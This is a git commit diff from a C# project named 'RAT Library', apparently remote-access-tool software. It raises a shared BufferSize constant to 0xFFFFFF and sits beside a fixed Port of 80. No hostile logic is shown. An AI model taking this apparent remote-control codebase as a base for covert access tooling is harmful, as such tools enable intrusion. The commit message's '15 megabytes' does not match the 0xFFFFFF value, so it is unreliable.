1f0464fd91cfb12dd65c558efa59dcd37baf3401
constanthinium <constanthinium@gmail.com>
2021-03-04 21:16:32 +0300

    Increase buffer size to 15 megabytes

--- RAT Library/Common.cs
+++ RAT Library/Common.cs
@@ -5,7 +5,7 @@ namespace RAT_Library
     public static class Common
     {
         public static readonly Encoding MessageEncoding = Encoding.GetEncoding(1251);
-        public const int BufferSize = 200_000;
+        public const int BufferSize = 0xFFFFFF;
         public const int Port = 80;
     }
 }
